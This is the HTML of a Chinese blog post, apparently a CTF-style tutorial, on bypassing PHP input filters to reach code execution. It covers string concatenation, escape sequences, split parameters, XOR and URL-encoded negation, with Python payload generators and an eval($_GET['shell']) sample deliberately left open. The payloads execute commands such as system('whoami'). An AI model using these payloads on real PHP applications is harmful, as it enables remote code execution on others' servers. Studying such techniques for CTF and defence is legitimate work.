@@ -1,0 +1,400 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>PHP:过滤限制绕过方法 - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="https://blog.csdn.net/mochu7777777/article/details/104631142
+代码执行函数首先来看看在PHP中有哪些函数有代码执行的功能
+eval()最常,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">PHP:过滤限制绕过方法</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">PHP:过滤限制绕过方法</h1>
+        <div class="stuff">
+            <span>七月 21, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/104631142">https://blog.csdn.net/mochu7777777/article/details/104631142</a></p>
+<h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><p>首先来看看在PHP中有哪些函数有代码执行的功能</p>
+<h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>最常见的代码执行函数，把字符串 code 作为PHP代码执行。</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">eval</span> <span class="token punctuation">(</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> mixed</code></pre>
+<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>检查一个断言是否为false</p>
+<pre class=" language-php"><code class="language-php"><span class="token constant">PHP</span> <span class="token number">5</span>
+<span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$description</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool</code></pre>
+<pre class=" language-php"><code class="language-php"><span class="token constant">PHP</span> <span class="token number">7</span>
+<span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> Throwable <span class="token variable">$exception</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> bool</code></pre>
+<p>assert()会检查指定的assertion并在结果为false时采取适当的行动。在PHP5或PHP7中，如果assertion是字符串，它将会被assert()当做PHP代码来执行。</p>
+<h4 id="preg-replace-e"><a href="#preg-replace-e" class="headerlink" title="preg_replace()+/e"></a>preg_replace()+/e</h4><p>执行一个正则表达式的搜索和替换</p>
+<pre><code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code></pre>
+<p>搜索subject中匹配pattern的部分，以replacement进行替换。如果pattern的模式修饰符使用/e，那么当subject被匹配成功时，replacement会被当做PHP代码执行</p>
+<pre><code>PS： preg_replace()+函数的/e修饰符在PHP7中被移除</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004140595.png" alt="1"></p>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004201887.png" alt="2"></p>
+<h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h4><p>创建一个匿名（lambda样式）函数</p>
+<pre class=" language-php"><code class="language-php"><span class="token function">create_function</span> <span class="token punctuation">(</span> string <span class="token variable">$args</span> <span class="token punctuation">,</span> string <span class="token variable">$code</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> string</code></pre>
+<p>根据传递的参数创建一个匿名函数，并为其返回唯一的名称。如果没有严格对参数传递进行过滤，攻击者可以构造payload传递给<code>create_function()</code>对<code>参数或函数体</code>闭合注入恶意代码导致代码执行<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004301611.png" alt="3"></p>
+<h3 id="可回调函数"><a href="#可回调函数" class="headerlink" title="可回调函数"></a>可回调函数</h3><h4 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h4><p>为数组的每个元素应用回调函数</p>
+<pre><code>array_map ( callable $callback , array $array , array ...$arrays ) : array</code></pre>
+<p>返回数组，是为<code>array</code>每个元素应用<code>callback</code>函数之后的数组。 <code>array_map()</code>返回一个<code>array</code>，数组内容为<code>array1</code>的元素按索引顺序为参数调用<code>callback</code>后的结果（有更多数组时，还会传入<code>arrays</code>的元素）。 <code>callback</code>函数形参的数量必须匹配<code>array_map()</code>实参中数组的数量。</p>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004401814.png" alt="4"></p>
+<h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h4><p>把第一个参数作为回调函数调用</p>
+<pre><code>call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</code></pre>
+<p>第一个参数<code>callback</code>是被调用的回调函数，其余参数是回调函数的参数。<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722011136128.png" alt="image-20210722011136128"></p>
+<h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h4><p>调用回调函数，并把一个数组参数作为回调函数的参数</p>
+<p>call_user_func_array ( callable $callback , array $param_arr ) : mixed</p>
+<p>把第一个参数作为回调函数callback调用，把参数数组作param_arr为回调函数的的参数传入。跟array_map()相似<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004459054.png" alt="5"></p>
+<h4 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h4><p>用回调函数过滤数组中的单元</p>
+<pre><code>array_filter ( array $array [, callable $callback [, int $flag = 0 ]] ) : array</code></pre>
+<p>依次将array数组中的每个值传递到callback函数。如果callback函数返回true，则array数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004521379.png" alt="6"></p>
+<h4 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h4><p>使用用户自定义的比较函数对数组中的值进行排序</p>
+<pre><code>usort ( array &amp;$array , callable $value_compare_func ) : bool</code></pre>
+<p>本函数将用用户自定义的比较函数对一个数组中的值进行排序。 如果要排序的数组需要用一种不寻常的标准进行排序，那么应该使用此函数。</p>
+<p>当PHP &lt; 5.6时<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004613149.png" alt="7"><br>当PHP &gt;= 5.6 &amp; PHP &lt; 7时，php有一个参数变长特性<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004624831.png" alt="8"><br>等等还有很多函数参数是可回调的，就不一一列举了。</p>
+<p>接下来根据各种过滤情况来看看具体的一些绕过方法</p>
+<h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h3><p>字符串拼接绕过适用于绕过过滤具体关键字的限制</p>
+<pre><code>适用PHP版本：PHP&gt;=7</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004702791.png" alt="9"></p>
+<p>Payload:</p>
+<pre><code>(p.h.p.i.n.f.o)();
+(sy.(st).em)(whoami);
+(sy.(st).em)(who.ami);
+(s.y.s.t.e.m)("whoami");
+.......</code></pre>
+<pre><code>在PHP中不一定需要引号(单引号/双引号)来表示字符串。PHP支持我们声明元素的类型，比如$name = (string)mochu7;，在这种情况下，$name就包含字符串"mochu7"，此外，如果不显示声明类型，那么PHP会将圆括号内的数据当成字符串来处理</code></pre>
+<h3 id="字符串转义绕过"><a href="#字符串转义绕过" class="headerlink" title="字符串转义绕过"></a>字符串转义绕过</h3><pre><code>适用PHP版本：PHP&gt;=7</code></pre>
+<p>以八进制表示的[0–7]{1,3}转义字符会自动适配byte（如”\400” == “\000”）<br>以十六进制的\x[0–9A-Fa-f]{1,2}转义字符表示法（如“\x41”）<br>以Unicode表示的\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串</p>
+<p><strong>注意这里转义后的字符必须双引号包裹传参</strong></p>
+<p>Payload处理脚本如下：</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span>
+
+<span class="token keyword">def</span> <span class="token function">hex_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    res_payload <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
+        i <span class="token operator">=</span> <span class="token string">"\\x"</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+        res_payload <span class="token operator">+=</span> i
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to hex: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">oct_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    res_payload <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
+        i <span class="token operator">=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> oct<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
+        res_payload <span class="token operator">+=</span> i
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to oct: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">uni_payload</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    res_payload <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
+        i <span class="token operator">=</span> <span class="token string">"\\u{{{0}}}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        res_payload <span class="token operator">+=</span> i
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]'{}' Convert to unicode: \"{}\""</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>res_payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string">'phpinfo'</span>
+    hex_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    oct_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    uni_payload<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre>
+<p>Payload</p>
+<pre><code>"\x70\x68\x70\x69\x6e\x66\x6f"();#phpinfo();
+"\163\171\163\164\145\155"('whoami');#system('whoami');
+"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"('id');#system('whoami');
+"\163\171\163\164\145\155"("\167\150\157\141\155\151");#system('whoami');
+.......</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004831266.png" alt="10"><br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004847635.png" alt="11"></p>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004900042.png" alt="12">另外，八进制的方法可以绕过无字母传参进行代码执行</p>
+<pre><code>"\163\171\163\164\145\155"("\167\150\157\141\155\151");#system('whoami');</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004921639.png" alt="13"></p>
+<h3 id="多次传参绕过"><a href="#多次传参绕过" class="headerlink" title="多次传参绕过"></a>多次传参绕过</h3><pre><code>适用PHP版本：无限制</code></pre>
+<p>如果过滤了<code>引号(单引号/双引号)，</code>可以通过以下方法绕过<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722004955533.png" alt="14"></p>
+<pre><code>GET:
+?1=system&amp;2=whoami
+POST:
+cmd=$_GET[1]($_GET[2]);</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005011972.png" alt="15"></p>
+<pre><code>cmd=$_POST[1]($_POST[2]);&amp;1=system&amp;2=whoami</code></pre>
+<p>如果<code>PHP版本大于7</code>这里还可以用拼接的方法绕过过滤引号</p>
+<pre><code>(sy.st.em)(whoami);</code></pre>
+<p>另外如果碰到参数长度受限制，也可以通过多次传参的方法绕过参数长度限制或者回调函数</p>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005112326.png" alt="16"></p>
+<p>回调函数可能大部分看限制的具体长度，但是在<code>PHP &gt;= 5.6 &amp; PHP &lt; 7</code>时对以上过滤方法可以绕过</p>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005129999.png" alt="17"></p>
+<h3 id="内置函数访问绕过"><a href="#内置函数访问绕过" class="headerlink" title="内置函数访问绕过"></a>内置函数访问绕过</h3><pre><code>适用于PHP版本：Windows本地测试的是PHP&gt;=7可以成功，PHP5测试虽然报错但是并不肯定不能使用</code></pre>
+<p>get_defined_functions()：返回所有已定义函数的数组</p>
+<p>详情见：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.get-defined-functions.php">https://www.php.net/manual/zh/function.get-defined-functions.php</a></p>
+<p>利用这种方法首先还需要知道PHP的具体版本，因为每个版本的get_defined_functions()返回的值都是不一样的，这里以php7.4.3为准<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005344190.png" alt="18"></p>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005358422.png" alt="19"></p>
+<h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005412630.png" alt="20">异或绕过</h3><pre><code>适用PHP版本：无限制</code></pre>
+<p>在PHP中两个字符串异或之后，得到的还是一个字符串。<br>例如：我们异或 ? 和 ~ 之后得到的是 A<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005443996.png" alt="21"></p>
+<pre><code>字符：?         ASCII码：63           二进制：  00‭11 1111‬
+字符：~         ASCII码：126          二进制：  0111 1110‬
+异或规则：
+1   XOR   0   =   1
+0   XOR   1   =   1
+0   XOR   0   =   0
+1   XOR   1   =   0
+上述两个字符异或得到 二进制：  0100 0001
+该二进制的十进制也就是：65
+对应的ASCII码是：A</code></pre>
+<p>接下来看一道例题：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"hacker!!"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>过滤了所有英文字母和数字，但是我们知道ASCII码中还有很多字母数字之外的字符，利用这些字符进行异或可以得到我们想要的字符</p>
+<pre><code>PS：取ASCII表种非字母数字的其他字符，要注意有些字符可能会影响整个语句执行，所以要去掉如：反引号，单引号</code></pre>
+<p>脚本如下：</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+
+payload <span class="token operator">=</span> <span class="token string">"assert"</span>
+strlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true">#strlist是ascii表中所有非字母数字的字符十进制</span>
+str1<span class="token punctuation">,</span>str2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>
+
+<span class="token keyword">for</span> char <span class="token keyword">in</span> payload<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> strlist<span class="token punctuation">:</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">^</span> j <span class="token operator">==</span> ord<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                i <span class="token operator">=</span> <span class="token string">'%{:0>2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                j <span class="token operator">=</span> <span class="token string">'%{:0>2}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"('{0}'^'{1}')"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>
+                <span class="token keyword">break</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">continue</span>
+        <span class="token keyword">break</span></code></pre>
+<p>一次代码执行只能得到我们想要执行语句的字符串，并不能执行语句，所以需要执行两次代码执行，构造</p>
+<pre><code>assert($_GET[_]);</code></pre>
+<p>使用脚本对每个字母进行转换，然后拼接</p>
+<pre><code>$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');
+//$_='assert';
+$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');
+//$__='_GET';
+$___=$$__;
+//$___='$_GET';
+$_($___[_]);
+//assert($_GET[_]);</code></pre>
+<p>payload</p>
+<pre><code>$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');$___=$$__;$_($___[_]);&amp;_=phpinfo();</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005559983.png" alt="22"><br>经本地测试，发现这种方法可以在<code>php5</code>以及<code>php7.0.9</code>版本种使用，因为assert()的问题，并不是异或不能使用<br>注：PHP5低版本有些可能因为magic_quotes_gpc开启的关系导致无法利用<br><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005611583.png" alt="23"><br>当过滤字符的范围没有那么大，或者只是过滤关键字的时候可以使用如下脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+
+<span class="token keyword">import</span> string
+
+char <span class="token operator">=</span> string<span class="token punctuation">.</span>printable
+cmd <span class="token operator">=</span> <span class="token string">'system'</span>
+tmp1<span class="token punctuation">,</span>tmp2 <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span><span class="token string">''</span>
+<span class="token keyword">for</span> res <span class="token keyword">in</span> cmd<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> char<span class="token punctuation">:</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> char<span class="token punctuation">:</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">^</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">==</span> ord<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                tmp1 <span class="token operator">+=</span> i
+                tmp2 <span class="token operator">+=</span> j
+                <span class="token keyword">break</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">continue</span>
+        <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"('{}'^'{}')"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>tmp1<span class="token punctuation">,</span>tmp2<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<pre><code>PS C:\Users\Administrator&gt; php -r "var_dump('000000'^'CICDU]');"
+Command line code:1:
+string(6) "system"</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005741747.png" alt="24"><br>再放个网上看到的payload</p>
+<pre><code>${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
+//${_GET}{%ff}();&amp;%ff=phpinfo</code></pre>
+<h3 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h3><pre><code>适用PHP版本：无限制</code></pre>
+<p>还是上面那个例题<br>当PHP&gt;=7时，可以直接利用取反构造payload</p>
+<pre><code>PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'phpinfo'));"
+Command line code:1:
+string(21) "%8F%97%8F%96%91%99%90"</code></pre>
+<pre><code>(~%8F%97%8F%96%91%99%90)();
+#phpinfo();</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005814900.png" alt="25"><br>有参数的</p>
+<pre><code>PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'system'));"
+Command line code:1:
+string(18) "%8C%86%8C%8B%9A%92"
+PS C:\Users\Administrator&gt; php -r "var_dump(urlencode(~'whoami'));"
+Command line code:1:
+string(18) "%88%97%90%9E%92%96"</code></pre>
+<p>payload</p>
+<pre><code>(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);
+#system('whoami');</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005839305.png" alt="26"></p>
+<p>当<code>5&lt;=PHP&lt;=7.0.9</code>时，需要再执行一次构造出来的字符，所以参考上面那种<code>异或拼接</code>的方法</p>
+<pre><code>$_=(~'%9E%8C%8C%9A%8D%8B');$__='_'.(~'%AF%B0%AC%AB');$___=$$__;$_($___[_]);
+#assert($_POST[_]);</code></pre>
+<p><img src="/2021/07/21/php-guo-lu-xian-zhi-rao-guo-fang-fa/image-20210722005919729.png" alt="27"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='true'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
